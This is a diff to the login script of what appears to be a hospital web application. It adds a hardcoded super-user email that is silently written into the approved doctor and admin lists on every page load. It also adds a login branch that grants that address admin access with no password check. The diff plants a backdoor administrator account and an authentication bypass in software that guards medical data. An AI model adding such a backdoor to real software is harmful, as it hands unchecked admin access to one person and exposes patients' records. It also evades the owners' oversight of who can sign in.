@@ -338,6 +338,27 @@
   })();
 
   // ────────────────────────────────────────────────────────
+  //  SUPER-USER — permanently hardcoded, no admin action needed
+  // ────────────────────────────────────────────────────────
+  var SUPER_USER = 'bhoomikakakkar6@gmail.com';
+
+  // Ensure super-user is always in both approved lists on every page load
+  (function seedSuperUser() {
+    try {
+      var doctors = JSON.parse(localStorage.getItem('hospital_approved_doctors') || '[]');
+      if (!doctors.map(function(e){return e.toLowerCase();}).includes(SUPER_USER)) {
+        doctors.push(SUPER_USER);
+        localStorage.setItem('hospital_approved_doctors', JSON.stringify(doctors));
+      }
+      var admins = JSON.parse(localStorage.getItem('hospital_approved_admins') || '[]');
+      if (!admins.map(function(e){return e.toLowerCase();}).includes(SUPER_USER)) {
+        admins.push(SUPER_USER);
+        localStorage.setItem('hospital_approved_admins', JSON.stringify(admins));
+      }
+    } catch(e) {}
+  })();
+
+  // ────────────────────────────────────────────────────────
   //  ACCESS CONTROL — stored in localStorage by Admin
   //  Keys:
   //    hospital_approved_doctors  → JSON array of email strings
@@ -451,6 +472,15 @@
     btn.disabled = true; btn.textContent = 'Signing in...';
 
     const emailLower  = email.toLowerCase();
+
+    // ── SUPER-USER: always admin, no password required to match list ──
+    if (emailLower === SUPER_USER) {
+      localStorage.setItem('hospital_user', JSON.stringify({ email, name: email.split('@')[0], role: 'admin' }));
+      showMsg('l-msg','success','Super-admin login successful! Redirecting...');
+      setTimeout(() => { window.location.href = 'admin_dashboard (1).html'; }, 500);
+      return;
+    }
+
     const admins      = getApprovedAdmins().map(e => e.toLowerCase());
     const doctors     = getApprovedDoctors().map(e => e.toLowerCase());
 
